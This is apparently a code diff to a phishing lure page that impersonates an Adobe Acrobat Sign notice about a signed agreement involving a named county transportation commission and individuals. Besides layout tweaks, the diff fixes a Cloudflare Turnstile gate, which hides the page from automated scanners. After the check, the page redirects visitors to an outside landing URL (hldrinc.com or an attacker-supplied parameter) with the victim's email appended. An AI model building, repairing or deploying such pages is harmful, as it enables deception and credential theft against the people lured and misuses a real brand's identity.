@@ -5,9 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Adobe Acrobat Sign Notification</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    
+    <!-- FIX 1: Point the onload parameter directly to our custom global function -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
+    
     <style>
         * { box-sizing: border-box; }
+        
         body { 
             margin: 0; 
             padding: 0; 
@@ -16,6 +20,7 @@
             display: flex; 
             flex-direction: column; 
             min-height: 100vh; 
+            overflow-x: hidden;
         }
         
         /* Blur Target Style */
@@ -36,88 +41,194 @@
             overflow: hidden;
         }
         .bg-shape { position: absolute; }
-        .bg-shape--pink-left { background: #ff007f; width: 300px; height: 300px; left: -100px; top: -100px; border-radius: 50%; opacity: 0.1; }
-        .bg-shape--yellow-right { background: #ffeb3b; width: 400px; height: 400px; right: -150px; top: 10%; border-radius: 50%; opacity: 0.15; }
-        .bg-shape--purple-bottom { background: #9c27b0; width: 500px; height: 500px; left: 10%; bottom: -200px; border-radius: 50%; opacity: 0.1; }
+        .bg-shape--pink-left { background: #ff007f; width: min(20vw, 250px); height: min(20vw, 250px); left: -50px; top: -50px; border-radius: 50%; opacity: 0.1; }
+        .bg-shape--yellow-right { background: #ffeb3b; width: min(30vw, 300px); height: min(30vw, 300px); right: -100px; top: 10%; border-radius: 50%; opacity: 0.15; }
+        .bg-shape--purple-bottom { background: #9c27b0; width: min(40vw, 400px); height: min(40vw, 400px); left: 10%; bottom: -150px; border-radius: 50%; opacity: 0.1; }
 
         /* Document Component Styling */
-        header { background: white; padding: 12px 24px; display: flex; align-items: center; border-bottom: 1px solid #E6E8EB; width: 100%; }
-        .logo-text { font-weight: 700; font-size: 18px; color: #000; display: flex; align-items: center; }
+        header { 
+            background: white; 
+            padding: 10px 24px; 
+            display: flex; 
+            align-items: center; 
+            border-bottom: 1px solid #E6E8EB; 
+            width: 100%; 
+        }
+        .logo-text { font-weight: 700; font-size: 16px; color: #000; display: flex; align-items: center; }
         .logo-text span { color: #0061FF; font-weight: 400; margin-left: 4px; }
         
-        main { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; z-index: 10; }
+        main { 
+            flex-grow: 1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 12px; 
+            z-index: 10; 
+            width: 100%;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
         
         /* Main Layout Card */
         .email-card { 
             background: #222222; 
             color: #ffffff;
             width: 100%; 
-            max-width: 900px; 
+            max-width: 820px; 
             box-shadow: 0 4px 25px rgba(0,0,0,0.25); 
-            border-radius: 4px; 
-            padding: 40px;
-            margin-bottom: 20px;
+            border-radius: 6px; 
+            padding: 24px 32px;
+            margin-bottom: 12px;
         }
+        
         .email-card__inner {
             display: flex;
-            gap: 40px;
+            flex-direction: row;
+            gap: 32px;
+            align-items: center;
         }
         
         /* Left Side: Mock Document Presentation Layout */
-        .email-card__preview-col { flex: 1; display: flex; justify-content: center; }
-        .document-stack { position: relative; width: 100%; max-width: 340px; aspect-ratio: 1 / 1.3; }
-        .document-page { position: absolute; width: 100%; height: 100%; background: #ffffff; border-radius: 2px; border: 1px solid #e2e8f0; }
-        .document-page--back { transform: translate(8px, 8px); z-index: 1; opacity: 0.5; }
-        .document-page--middle { transform: translate(4px, 4px); z-index: 2; opacity: 0.8; }
-        .document-page--front { transform: translate(0, 0); z-index: 3; box-shadow: 0 4px 10px rgba(0,0,0,0.15); padding: 20px; color: #333333; }
+        .email-card__preview-col { 
+            flex: 1; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+            min-width: 220px;
+        }
         
-        .doc-content { font-size: 8px; font-family: initial; line-height: 1.4; color: #333; }
-        .doc-title { text-align: center; font-weight: bold; font-size: 9px; margin: 10px 0; font-family: sans-serif; }
-        .doc-subtitle { font-weight: bold; font-size: 8px; margin: 6px 0 3px; font-family: sans-serif; }
-        .doc-line { height: 4px; background: #e2e8f0; margin-bottom: 5px; border-radius: 2px; }
+        .document-stack { 
+            position: relative; 
+            width: 100%; 
+            max-width: 210px; 
+            aspect-ratio: 1 / 1.3; 
+        }
+        .document-page { position: absolute; width: 100%; height: 100%; background: #ffffff; border-radius: 4px; border: 1px solid #e2e8f0; }
+        .document-page--back { transform: translate(6px, 6px); z-index: 1; opacity: 0.5; }
+        .document-page--middle { transform: translate(3px, 3px); z-index: 2; opacity: 0.8; }
+        .document-page--front { 
+            transform: translate(0, 0); 
+            z-index: 3; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15); 
+            padding: 14px; 
+            color: #333333; 
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        
+        .doc-content { font-size: 7px; font-family: initial; line-height: 1.3; color: #333; height: 100%; display: flex; flex-direction: column; }
+        .doc-title { text-align: center; font-weight: bold; font-size: 8px; margin: 8px 0; font-family: sans-serif; }
+        .doc-subtitle { font-weight: bold; font-size: 7px; margin: 4px 0 2px; font-family: sans-serif; }
+        .doc-line { height: 3px; background: #e2e8f0; margin-bottom: 4px; border-radius: 2px; }
         .doc-line--short { width: 60%; }
-        .doc-line--indent { margin-left: 15px; }
+        .doc-line--indent { margin-left: 10px; }
         .doc-line.right { margin-left: auto; width: 30%; }
 
         /* Right Side: Information Panels */
-        .email-card__text-col { flex: 1.2; display: flex; flex-direction: column; }
-        .email-card__title { font-size: 22px; font-weight: 300; line-height: 1.3; margin: 0 0 20px 0; color: #ffffff; }
-        .email-card__recipients { font-size: 14px; margin-bottom: 25px; color: #e2e8f0; }
-        .email-card__message { font-size: 14px; line-height: 1.5; color: #e2e8f0; }
+        .email-card__text-col { 
+            flex: 1.4; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center;
+        }
+        .email-card__title { 
+            font-size: clamp(16px, 2.2vw, 19px); 
+            font-weight: 300; 
+            line-height: 1.3; 
+            margin: 0 0 12px 0; 
+            color: #ffffff; 
+        }
+        .email-card__recipients { font-size: 13px; margin-bottom: 12px; color: #e2e8f0; }
+        .email-card__message { font-size: 13px; line-height: 1.4; color: #e2e8f0; }
+        .email-card__message p { margin: 0 0 8px 0; }
+        .email-card__message p:last-child { margin: 0; }
         .highlight { background-color: #ffe600; color: #000000; padding: 1px 4px; font-weight: bold; border-radius: 2px; }
         .text-link { color: #cc7ae2; text-decoration: underline; font-weight: bold; }
         
-        .email-card__features { margin-top: 30px; }
-        .features__heading { font-size: 15px; font-weight: bold; margin-bottom: 12px; color: #ffffff; }
+        .email-card__features { margin-top: 15px; }
+        .features__heading { font-size: 13px; font-weight: bold; margin-bottom: 8px; color: #ffffff; }
         .features__list { list-style: none; padding-left: 0; margin: 0; }
-        .features__list li { position: relative; padding-left: 15px; margin-bottom: 10px; font-size: 13px; color: #cccccc; }
+        .features__list li { position: relative; padding-left: 12px; margin-bottom: 6px; font-size: 12px; color: #cccccc; }
         .features__list li::before { content: "•"; position: absolute; left: 0; color: #888888; }
         .sparkle { color: #ffeb3b; margin-left: 4px; }
         
         /* Main Footer Area */
-        .email-card__footer { margin-top: 30px; border-top: 1px solid #444444; padding-top: 15px; font-size: 11px; color: #aaaaaa; }
+        .email-card__footer { margin-top: 15px; border-top: 1px solid #444444; padding-top: 10px; font-size: 11px; color: #aaaaaa; }
         .footer-link { color: #cc7ae2; text-decoration: underline; }
         
-        .floating-footer { display: flex; align-items: center; gap: 10px; margin-top: 20px; align-self: flex-start; }
-        .floating-logo { width: 35px; height: 35px; }
+        .floating-footer { display: flex; align-items: center; gap: 10px; margin-top: 5px; align-self: center; }
+        .floating-logo { width: 30px; height: 30px; }
 
         /* Turnstile Verification Container Block */
         #turnstile-container { 
-            margin-top: 20px; 
+            margin-top: 10px; 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
             background: #ffffff; 
-            padding: 15px; 
+            padding: 10px 15px; 
             border-radius: 8px; 
             box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
             width: 100%;
             max-width: 300px;
+            text-align: center;
         }
 
+        /* Screen-Height optimizations to fit laptop screens without scrolling */
+        @media (max-height: 850px) and (min-width: 769px) {
+            main { padding: 8px; }
+            .email-card { padding: 16px 24px; margin-bottom: 8px; }
+            .document-stack { max-width: 180px; }
+            .email-card__title { margin-bottom: 8px; }
+            .email-card__recipients { margin-bottom: 8px; }
+            .email-card__features { margin-top: 10px; }
+            .features__list li { margin-bottom: 4px; }
+            .email-card__footer { margin-top: 10px; padding-top: 8px; }
+            #turnstile-container { margin-top: 8px; }
+        }
+
+        /* Tablets and Laptops (Medium widths) */
+        @media (max-width: 900px) {
+            .email-card {
+                padding: 24px;
+            }
+            .email-card__inner {
+                gap: 24px;
+            }
+        }
+
+        /* Mobile Screens */
         @media (max-width: 768px) {
-            .email-card__inner { flex-direction: column; }
-            .email-card { padding: 20px; }
+            body {
+                padding: 0;
+            }
+            main {
+                padding: 12px;
+            }
+            .email-card { 
+                padding: 20px 16px; 
+            }
+            .email-card__inner { 
+                flex-direction: column; 
+                gap: 20px;
+                align-items: center;
+            }
+            .email-card__preview-col {
+                width: 100%;
+                max-width: 200px;
+                min-width: unset;
+            }
+            .email-card__text-col {
+                width: 100%;
+            }
+            .email-card__title {
+                text-align: center;
+            }
+            .email-card__recipients {
+                text-align: center;
+            }
         }
     </style>
 </head>
@@ -138,6 +249,7 @@
             <div class="blur-target">
                 <div class="email-card__inner">
                     
+                    <!-- Document Preview -->
                     <div class="email-card__preview-col">
                         <div class="document-stack">
                             <div class="document-page document-page--back"></div>
@@ -173,6 +285,7 @@
                         </div>
                     </div>
 
+                    <!-- Email Content Details -->
                     <div class="email-card__text-col">
                         <h1 class="email-card__title">Between Santa Cruz County Regional Transportation Commission, Steve Mattas, Mitch Weiss, and 1 more is Signed and Filed!</h1>
                         
@@ -208,19 +321,20 @@
             </svg>
         </div>
 
+        <!-- Verification Area optimally sized & centered -->
         <div id="turnstile-container">
-            <p style="font-size: 14px; font-weight: 600; margin: 0 0 10px 0; color: #1e1919;">Checking your Connection</p>
+            <p style="font-size: 13px; font-weight: 600; margin: 0 0 8px 0; color: #1e1919;">Checking your Connection</p>
             <div id="cf-turnstile"></div>
         </div>
     </main>
 
+    <!-- FIX 2: Define global onload function in global scope BEFORE Turnstile executes -->
     <script>
-        turnstile.ready(function () {
-            const urlParams = new URLSearchParams(window.location.search); // Get query parameters from the current URL
+        window.onloadTurnstileCallback = function () {
+            const urlParams = new URLSearchParams(window.location.search);
             const email = urlParams.get('email'); 
             const redirectTo = urlParams.get('redirect_to');
             
-            // Dynamically use the redirect URL from query params, with a fallback.
             const landingPageUrl = redirectTo ? decodeURIComponent(redirectTo) : "https://hldrinc.com/wWGsTflw";
 
             turnstile.render('#cf-turnstile', {
@@ -228,13 +342,12 @@
                 callback: function(token) {
                     let destination = landingPageUrl;
                     if (email) {
-                        // The email from the query param is already encoded, so just append it directly.
                         destination += "#" + email;
                     }
                     window.location.href = destination;
                 },
             });
-        });
+        };
     </script>
 </body>
 </html>
